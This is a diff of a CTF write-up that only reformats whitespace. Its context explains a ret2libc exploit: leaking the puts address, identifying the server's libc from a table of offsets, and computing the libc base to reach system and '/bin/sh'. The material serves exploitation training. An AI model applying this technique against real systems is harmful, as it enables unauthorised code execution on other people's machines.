@@ -84,7 +84,7 @@ gdb-peda$ disas puts
 Dump of assembler code for function puts@plt:
    0x080483f0 <+0>:	  jmp    DWORD PTR ds:0x804a01c
    0x080483f6 <+6>:	  push   0x20
-   0x080483fb <+11>:	jmp    0x80483a0
+   0x080483fb <+11>:	  jmp    0x80483a0
 End of assembler dump.
 
 gdb-peda$ p shop_order 
@@ -107,13 +107,13 @@ puts_leak = u32(p.recv().split()[4][:4])
 #### Since ASLR is enabled on the challenge server, the address that we leaked will be different every time we run our script. After leaking the address of puts from the server, we input the last three bytes (even with ASLR, the last three bytes will always be constant) of what we have to ```libc.blukat.me``` to find out which version of libc the server uses and to know at what offsets our ingredients for ret2libc reside. 
 ```
 libc6-i386_2.23-0ubuntu11_amd64 
-  Symbol	    Offset	 
-	system	    0x03a940	
-	puts	      0x05f140	
-	open	      0x0d3f40	
-	read	      0x0d4350	
-	write	      0x0d43c0	
-	str_bin_sh	0x15902b	
+  Symbol      Offset	 
+  system      0x03a940	
+  puts	      0x05f140	
+  open	      0x0d3f40	
+  read	      0x0d4350	
+  write	      0x0d43c0	
+  str_bin_sh  0x15902b	
   exit        0002e7b0
 ```
 #### Great! Now we have the offsets for the ingredients we need for our exploit. But first, we need to calculate the base address for the libc using the formula ```libc_base = puts_leak - puts_offset```. After which, we add the offsets for the functions and variables we need to the libc_base to get their exact address in the libc. 
